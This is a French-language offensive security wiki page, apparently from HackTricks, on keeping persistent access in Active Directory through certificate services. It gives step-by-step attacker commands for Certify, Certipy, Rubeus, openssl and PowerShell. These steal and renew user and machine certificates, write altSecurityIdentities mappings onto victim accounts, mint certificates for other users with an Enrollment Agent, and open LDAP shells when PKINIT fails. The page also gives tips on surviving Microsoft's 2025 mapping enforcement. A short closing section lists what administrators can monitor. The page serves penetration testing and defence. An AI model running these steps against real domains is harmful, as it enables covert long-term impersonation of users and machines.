# Persistance de compte AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Voici un bref résumé des chapitres consacrés à la persistance des comptes de l’excellente étude disponible à l’adresse [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Comprendre le vol d’identifiants d’un utilisateur actif avec des certificats – PERSIST1

Dans un scénario où un certificat permettant l’authentification au domaine peut être demandé par un utilisateur, un attaquant peut demander et voler ce certificat afin de maintenir sa persistance sur un réseau. Par défaut, le modèle `User` dans Active Directory autorise ce type de demande, bien que cette fonctionnalité puisse parfois être désactivée.<sup>[[3]](#references)[[7]](#references)</sup>

Avec [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), vous pouvez rechercher les modèles activés qui autorisent l’authentification client, puis en demander un :
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
La puissance d’un certificat réside dans sa capacité à s’authentifier en tant que l’utilisateur auquel il appartient, indépendamment des changements de mot de passe, tant que le certificat reste valide.

Vous pouvez convertir PEM en PFX et l’utiliser pour obtenir un TGT :
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note : Associée à d’autres techniques (voir les sections THEFT), l’authentification basée sur les certificats permet un accès persistant sans toucher à LSASS, même depuis des contextes non élevés.

## Obtenir une persistance machine avec des certificats - PERSIST2

Si un attaquant dispose de privilèges élevés sur un hôte, il peut inscrire le compte machine du système compromis pour obtenir un certificat à l’aide du template par défaut `Machine`. S’authentifier en tant que machine permet d’utiliser S4U2Self pour les services locaux et peut fournir une persistance durable sur l’hôte :<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Étendre la persistance par le renouvellement de certificats - PERSIST3

Abuser des périodes de validité et de renouvellement des modèles de certificats permet à un attaquant de maintenir un accès à long terme. Si vous possédez un certificat précédemment émis et sa clé privée, vous pouvez le renouveler avant son expiration afin d’obtenir un identifiant récent et valable pendant longtemps, sans laisser d’artefacts de demande supplémentaires associés au principal d’origine.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Conseil opérationnel : Suivez la durée de vie des fichiers PFX détenus par l’attaquant et renouvelez-les rapidement. Le renouvellement peut également permettre aux certificats mis à jour d’inclure l’extension de mappage SID moderne, afin qu’ils restent utilisables avec des règles de mappage DC plus strictes (voir la section suivante).

## Implantation de mappages de certificats explicites (altSecurityIdentities) – PERSIST4

Si vous pouvez écrire dans l’attribut `altSecurityIdentities` d’un compte cible, vous pouvez mapper explicitement un certificat contrôlé par l’attaquant à ce compte. Cette persistance survit aux changements de mot de passe et, avec des formats de mappage forts, reste fonctionnelle sous les mécanismes modernes d’application des règles par les DC.<sup>[[2]](#references)</sup>

Flux général :

1. Obtenir ou émettre un certificat d’authentification client que vous contrôlez (par exemple, inscrire le template `User` en votre nom).
2. Extraire un identifiant fort du certificat (Issuer+Serial, SKI ou SHA1-PublicKey).
3. Ajouter un mappage explicite au principal victime dans `altSecurityIdentities` à l’aide de cet identifiant.
4. S’authentifier avec votre certificat ; le DC le mappe au compte victime via le mappage explicite.

Exemple (PowerShell) utilisant un mappage Issuer+Serial fort :
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ensuite, authentifiez-vous avec votre PFX. Certipy obtiendra directement un TGT :
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Création de mappings `altSecurityIdentities` forts

En pratique, les mappings **Issuer+Serial** et **SKI** sont les formats forts les plus faciles à créer à partir d’un certificat détenu par l’attaquant. Cela est important après le **11 février 2025**, lorsque les DC passent par défaut en **Full Enforcement** et que les mappings faibles cessent d’être fiables.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Utilisez uniquement des types de mapping forts : `X509IssuerSerialNumber`, `X509SKI` ou `X509SHA1PublicKey`. Les formats faibles (Subject/Issuer, Subject uniquement, e-mail RFC822) sont obsolètes et peuvent être bloqués par la policy du DC.
- Le mapping fonctionne sur les objets **user** et **computer** ; un accès en écriture à l'attribut `altSecurityIdentities` d'un compte computer suffit donc pour persister en tant que cette machine.
- La chaîne de certificats doit remonter jusqu'à une racine approuvée par le DC. Les Enterprise CAs présentes dans NTAuth sont généralement approuvées ; certains environnements approuvent également les CAs publiques.
- L'authentification Schannel reste utile pour la persistence même lorsque PKINIT échoue, car le DC ne dispose pas de l'EKU Smart Card Logon ou renvoie `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Mappings explicites `Issuer/SID` à partir de 2025

Sur les contrôleurs de domaine **Windows Server 2022+** ayant installé la mise à jour de sécurité du **9 septembre 2025**, Microsoft a ajouté un autre format de mapping explicite fort, intéressant pour la persistence car il résiste à la réémission d'un certificat par la même CA :<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Opérationnellement, cela diffère des anciens formats forts :
- `Issuer+Serial` épingle **un certificat exact**.
- `SKI` / `SHA1-PUKEY` épinglent **une paire de clés**.
- `Issuer/SID` épingle **l’AC émettrice + le SID cible**, de sorte que les certificats renouvelés ou réémis par la même AC continuent de fonctionner sans réécrire `altSecurityIdentities`.

Exigences et réserves
- Le certificat présenté pour l’ouverture de session doit effectivement contenir le SID du compte cible dans l’extension de sécurité SID.
- Ce format n’est pas utile pour les certificats de type `ESC9` / `ESC16` qui omettent l’extension SID ; dans ces cas, utilisez `Issuer+Serial`, `SKI` ou `SHA1-PUKEY`.

Pour plus d’informations sur les mappings explicites faibles et les chemins d’attaque, voir :


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent comme mécanisme de persistence – PERSIST5

Si vous obtenez un certificat valide de Certificate Request Agent/Enrollment Agent, vous pouvez créer à volonté de nouveaux certificats compatibles avec l’ouverture de session au nom des utilisateurs et conserver le PFX de l’agent hors ligne comme token de persistence. Workflow d’abus :<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La révocation du certificat de l’agent ou des permissions du template est nécessaire pour éliminer cette persistance.

Notes opérationnelles
- Les versions modernes de `Certipy` prennent en charge `-on-behalf-of` et `-renew`, ce qui permet à un attaquant détenant un Enrollment Agent PFX de générer, puis de renouveler, des certificats leaf sans avoir à interagir de nouveau avec le compte cible.<sup>[[4]](#references)</sup>
- Si l’obtention d’un TGT basé sur PKINIT n’est pas possible, le certificat on-behalf-of obtenu reste utilisable pour l’authentification Schannel avec `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Utilisation de certificats persistants lorsque PKINIT échoue

Si le DC ne possède pas de certificat capable de prendre en charge Smart Card Logon, l’authentification par certificat via PKINIT peut échouer avec `KDC_ERR_PADATA_TYPE_NOSUPP`. Cela **n’élimine pas** le mécanisme de persistance : le même PFX reste souvent utilisable pour accéder à LDAP via une authentification Schannel.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Cela est particulièrement utile après PERSIST4/PERSIST5, car vous pouvez continuer à opérer depuis Linux/macOS et enchaîner d’autres actions de persistence dans l’annuaire, comme déposer des [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ou modifier des attributs de délégation accessibles en écriture.

## 2025 Strong Certificate Mapping Enforcement : impact sur la persistence

Microsoft KB5014754 a introduit Strong Certificate Mapping Enforcement sur les contrôleurs de domaine. Depuis le **11 février 2025**, les DC utilisent par défaut le mode **Full Enforcement** pour les mappings faibles/ambigus et, depuis la mise à jour de sécurité du **9 septembre 2025**, les DC corrigés ne prennent plus en charge l’ancien fallback du mode Compatibility.<sup>[[1]](#references)</sup> Implications pratiques :

- Les certificats antérieurs à 2022 qui ne possèdent pas l’extension de mapping SID peuvent échouer lors du mapping implicite lorsque les DC sont en mode Full Enforcement. Les attaquants peuvent maintenir leur accès soit en renouvelant les certificats via AD CS (afin d’obtenir l’extension SID), soit en plaçant un mapping explicite fort dans `altSecurityIdentities` (PERSIST4).
- Les mappings explicites utilisant des formats forts (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` et, sur les DC modernes, `Issuer/SID`) continuent de fonctionner. Les formats faibles (Issuer/Subject, Subject-only, RFC822) peuvent être bloqués et doivent être évités pour la persistence.
- Si les mappings faibles semblent toujours fonctionner, supposez que vous avez rencontré un DC non corrigé ou configuré différemment, plutôt qu’un chemin de persistence fiable à long terme.
- Les chemins d’émission de type `ESC9` / `ESC16` qui suppriment l’extension SID rendent `Issuer/SID` inutilisable ; les mappings forts alternatifs ou le renouvellement via un template normal deviennent donc les options pratiques pour la persistence.

Les administrateurs doivent surveiller et générer des alertes sur :
- Les modifications de `altSecurityIdentities` ainsi que l’émission/le renouvellement de certificats Enrollment Agent et User.
- Les journaux d’émission de l’AC concernant les demandes on-behalf-of et les schémas de renouvellement inhabituels.

## Références

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
